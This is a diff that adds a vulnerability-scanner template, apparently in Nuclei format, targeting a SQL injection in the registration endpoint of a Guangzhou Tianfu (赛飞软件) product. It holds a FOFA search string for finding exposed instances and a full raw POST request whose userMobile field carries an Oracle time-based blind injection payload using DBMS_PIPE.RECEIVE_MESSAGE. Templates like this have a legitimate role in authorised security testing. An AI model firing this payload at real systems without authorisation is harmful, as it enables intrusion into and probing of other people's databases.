@@ -1,0 +1,42 @@
+id: poc-xg1mhgrzqxn1qzwr
+info:
+  name: 广州添富信息科技注册接口register!register.action存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xg1mhgrzqxn1qzwr'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xg1mhgrzqxn1qzwr
+    fofa: body=" 赛飞软件"
+http:
+- raw:
+  - 'POST /reg/register!register.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+    Referer:
+
+    Cookie: JSESSIONID=7C9E314666C1A79D1E70CC8866E8EBCE
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate,br
+
+    Content-Length: 317
+
+    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    Connection: Keep-alive
+
+
+    CodeNum=12345&ister.codeNum=12345&ister.company=test&ister.linkman=1&ister.maxCarNum=5&ister.password=TestPass123&ister.passwordConfirm=TestPass123&ister.userMobile=test''||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),5)||''&ister.userName=testuser&ister.vcCode=12345'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
